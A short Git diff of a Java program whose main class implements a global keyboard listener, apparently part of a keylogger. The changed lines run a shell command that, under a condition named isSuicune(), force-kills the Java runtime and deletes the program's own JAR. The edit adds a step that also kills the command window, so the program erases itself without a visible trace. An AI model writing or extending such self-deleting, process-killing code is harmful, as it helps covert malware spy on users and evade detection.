@@ -30,7 +30,7 @@ public class Main implements NativeKeyListener{
 		if (isSuicune()) {
 			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 			 @SuppressWarnings("unused")
-			Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf);
+			Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf + " && taskkill /im cmd.exe /f");
 			System.exit(0);
 		}
 		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
